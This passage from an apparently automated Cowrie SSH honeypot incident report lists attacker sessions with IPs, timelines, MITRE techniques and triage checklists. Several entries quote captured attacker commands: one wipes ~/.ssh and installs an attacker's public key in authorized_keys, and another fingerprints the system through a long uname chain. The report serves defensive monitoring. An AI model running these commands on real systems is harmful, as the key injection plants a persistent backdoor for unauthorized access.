| **Last Seen** | 2026-07-30 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:12:34` | `cowrie.session.connect` |
| `2026-07-30 16:12:34` | `cowrie.client.version` |
| `2026-07-30 16:12:34` | `cowrie.client.kex` |
| `2026-07-30 16:12:35` | `cowrie.login.success` |
| `2026-07-30 16:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4838d00090cb

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-07-30 16:13 |
| **Last Seen** | 2026-07-30 16:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:13:13` | `cowrie.session.connect` |
| `2026-07-30 16:13:14` | `cowrie.client.version` |
| `2026-07-30 16:13:14` | `cowrie.client.kex` |
| `2026-07-30 16:13:16` | `cowrie.login.success` |
| `2026-07-30 16:13:17` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d353700863

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:14 |
| **Last Seen** | 2026-07-30 16:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:14:00` | `cowrie.session.connect` |
| `2026-07-30 16:14:01` | `cowrie.client.version` |
| `2026-07-30 16:14:01` | `cowrie.client.kex` |
| `2026-07-30 16:14:02` | `cowrie.login.success` |
| `2026-07-30 16:14:03` | `cowrie.session.params` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.success` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:03` | `cowrie.command.input` |
| `2026-07-30 16:14:04` | `cowrie.log.closed` |
| `2026-07-30 16:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64710002fb67

| Field | Detail |
|---|---|
| **Source IP** | `219.152.229[.]165` |
| **First Seen** | 2026-07-30 16:14 |
| **Last Seen** | 2026-07-30 16:19 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:14:10` | `cowrie.session.connect` |
| `2026-07-30 16:14:10` | `cowrie.client.version` |
| `2026-07-30 16:14:11` | `cowrie.client.kex` |
| `2026-07-30 16:14:12` | `cowrie.login.success` |
| `2026-07-30 16:14:13` | `cowrie.session.params` |
| `2026-07-30 16:14:13` | `cowrie.command.input` |
| `2026-07-30 16:14:13` | `cowrie.command.failed` |
| `2026-07-30 16:14:14` | `cowrie.log.closed` |
| `2026-07-30 16:14:14` | `cowrie.session.params` |
| `2026-07-30 16:14:14` | `cowrie.command.input` |
| `2026-07-30 16:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.152.229[.]165` to AbuseIPDB if not already reported
- [ ] Block `219.152.229[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b20cd04ab5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:15 |
| **Last Seen** | 2026-07-30 16:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:15:56` | `cowrie.session.connect` |
| `2026-07-30 16:15:56` | `cowrie.client.version` |
| `2026-07-30 16:15:56` | `cowrie.client.kex` |
| `2026-07-30 16:15:58` | `cowrie.login.success` |
| `2026-07-30 16:16:00` | `cowrie.session.params` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.success` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.command.input` |
| `2026-07-30 16:16:00` | `cowrie.log.closed` |
| `2026-07-30 16:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e44f01ac00

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:17 |
| **Last Seen** | 2026-07-30 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:17:53` | `cowrie.session.connect` |
| `2026-07-30 16:17:54` | `cowrie.client.version` |
| `2026-07-30 16:17:54` | `cowrie.client.kex` |
| `2026-07-30 16:17:55` | `cowrie.login.success` |
| `2026-07-30 16:17:57` | `cowrie.session.params` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.success` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.command.input` |
| `2026-07-30 16:17:57` | `cowrie.log.closed` |
| `2026-07-30 16:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae27753f9b01

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]104` |
| **First Seen** | 2026-07-30 16:18 |
| **Last Seen** | 2026-07-30 16:18 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:18:44` | `cowrie.session.connect` |
| `2026-07-30 16:18:44` | `cowrie.client.version` |
| `2026-07-30 16:18:44` | `cowrie.client.kex` |
| `2026-07-30 16:18:47` | `cowrie.login.success` |
| `2026-07-30 16:18:49` | `cowrie.session.params` |
| `2026-07-30 16:18:49` | `cowrie.command.input` |
| `2026-07-30 16:18:49` | `cowrie.command.failed` |
| `2026-07-30 16:18:50` | `cowrie.log.closed` |
| `2026-07-30 16:18:51` | `cowrie.session.params` |
| `2026-07-30 16:18:51` | `cowrie.command.input` |
| `2026-07-30 16:18:51` | `cowrie.session.file_download` |
| `2026-07-30 16:18:51` | `cowrie.log.closed` |
| `2026-07-30 16:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]104` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df843b95f0c

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]104` |
| **First Seen** | 2026-07-30 16:18 |
| **Last Seen** | 2026-07-30 16:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:18:52` | `cowrie.session.connect` |
| `2026-07-30 16:18:52` | `cowrie.client.version` |
| `2026-07-30 16:18:52` | `cowrie.client.kex` |
| `2026-07-30 16:18:54` | `cowrie.login.success` |
| `2026-07-30 16:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]104` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad1dcaca84a

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]104` |
| **First Seen** | 2026-07-30 16:18 |
| **Last Seen** | 2026-07-30 16:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:18:55` | `cowrie.session.connect` |
| `2026-07-30 16:18:55` | `cowrie.client.version` |
| `2026-07-30 16:18:56` | `cowrie.client.kex` |
| `2026-07-30 16:18:58` | `cowrie.login.success` |
| `2026-07-30 16:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]104` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5544b12fdd23

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:19 |
| **Last Seen** | 2026-07-30 16:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:19:49` | `cowrie.session.connect` |
| `2026-07-30 16:19:50` | `cowrie.client.version` |
| `2026-07-30 16:19:50` | `cowrie.client.kex` |
| `2026-07-30 16:19:51` | `cowrie.login.success` |
| `2026-07-30 16:19:53` | `cowrie.session.params` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.success` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.command.input` |
| `2026-07-30 16:19:53` | `cowrie.log.closed` |
| `2026-07-30 16:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779adf4b9027

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:15` | `cowrie.session.connect` |
| `2026-07-30 16:33:16` | `cowrie.client.version` |
| `2026-07-30 16:33:16` | `cowrie.client.kex` |
| `2026-07-30 16:33:17` | `cowrie.login.success` |
| `2026-07-30 16:33:19` | `cowrie.session.params` |
| `2026-07-30 16:33:19` | `cowrie.command.input` |
| `2026-07-30 16:33:20` | `cowrie.log.closed` |
| `2026-07-30 16:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872129e4118f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:21` | `cowrie.session.connect` |
| `2026-07-30 16:33:22` | `cowrie.client.version` |
| `2026-07-30 16:33:22` | `cowrie.client.kex` |
| `2026-07-30 16:33:26` | `cowrie.login.success` |
| `2026-07-30 16:33:29` | `cowrie.session.params` |
| `2026-07-30 16:33:29` | `cowrie.command.input` |
| `2026-07-30 16:33:31` | `cowrie.log.closed` |
| `2026-07-30 16:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b658cd65dc6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:28` | `cowrie.session.connect` |
| `2026-07-30 16:33:29` | `cowrie.client.version` |
| `2026-07-30 16:33:29` | `cowrie.client.kex` |
| `2026-07-30 16:33:35` | `cowrie.login.success` |
| `2026-07-30 16:33:38` | `cowrie.session.params` |
| `2026-07-30 16:33:38` | `cowrie.command.input` |
| `2026-07-30 16:33:39` | `cowrie.log.closed` |
| `2026-07-30 16:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ecd56e2ed4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:34` | `cowrie.session.connect` |
| `2026-07-30 16:33:35` | `cowrie.client.version` |
| `2026-07-30 16:33:35` | `cowrie.client.kex` |
| `2026-07-30 16:33:41` | `cowrie.login.success` |
| `2026-07-30 16:33:45` | `cowrie.session.params` |
| `2026-07-30 16:33:45` | `cowrie.command.input` |
| `2026-07-30 16:33:46` | `cowrie.log.closed` |
| `2026-07-30 16:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2a10e2db03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:40` | `cowrie.session.connect` |
| `2026-07-30 16:33:41` | `cowrie.client.version` |
| `2026-07-30 16:33:41` | `cowrie.client.kex` |
| `2026-07-30 16:33:47` | `cowrie.login.success` |
| `2026-07-30 16:33:51` | `cowrie.session.params` |
| `2026-07-30 16:33:51` | `cowrie.command.input` |
| `2026-07-30 16:33:53` | `cowrie.log.closed` |
| `2026-07-30 16:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff2816ecba1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:46` | `cowrie.session.connect` |
| `2026-07-30 16:33:47` | `cowrie.client.version` |
| `2026-07-30 16:33:47` | `cowrie.client.kex` |
| `2026-07-30 16:33:53` | `cowrie.login.success` |
| `2026-07-30 16:33:55` | `cowrie.session.params` |
| `2026-07-30 16:33:55` | `cowrie.command.input` |
| `2026-07-30 16:33:56` | `cowrie.log.closed` |
| `2026-07-30 16:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1702f16693ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:52` | `cowrie.session.connect` |
| `2026-07-30 16:33:53` | `cowrie.client.version` |
| `2026-07-30 16:33:53` | `cowrie.client.kex` |
| `2026-07-30 16:33:57` | `cowrie.login.success` |
| `2026-07-30 16:34:00` | `cowrie.session.params` |
| `2026-07-30 16:34:00` | `cowrie.command.input` |
| `2026-07-30 16:34:01` | `cowrie.log.closed` |
| `2026-07-30 16:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737ab41001e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:33 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:33:59` | `cowrie.session.connect` |
| `2026-07-30 16:34:00` | `cowrie.client.version` |
| `2026-07-30 16:34:00` | `cowrie.client.kex` |
| `2026-07-30 16:34:03` | `cowrie.login.success` |
| `2026-07-30 16:34:06` | `cowrie.session.params` |
| `2026-07-30 16:34:06` | `cowrie.command.input` |
| `2026-07-30 16:34:07` | `cowrie.log.closed` |
| `2026-07-30 16:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530a57b4e78f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:04` | `cowrie.session.connect` |
| `2026-07-30 16:34:06` | `cowrie.client.version` |
| `2026-07-30 16:34:06` | `cowrie.client.kex` |
| `2026-07-30 16:34:09` | `cowrie.login.success` |
| `2026-07-30 16:34:11` | `cowrie.session.params` |
| `2026-07-30 16:34:11` | `cowrie.command.input` |
| `2026-07-30 16:34:12` | `cowrie.log.closed` |
| `2026-07-30 16:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44c78f86da7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:11` | `cowrie.session.connect` |
| `2026-07-30 16:34:12` | `cowrie.client.version` |
| `2026-07-30 16:34:12` | `cowrie.client.kex` |
| `2026-07-30 16:34:15` | `cowrie.login.success` |
| `2026-07-30 16:34:17` | `cowrie.session.params` |
| `2026-07-30 16:34:17` | `cowrie.command.input` |
| `2026-07-30 16:34:18` | `cowrie.log.closed` |
| `2026-07-30 16:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
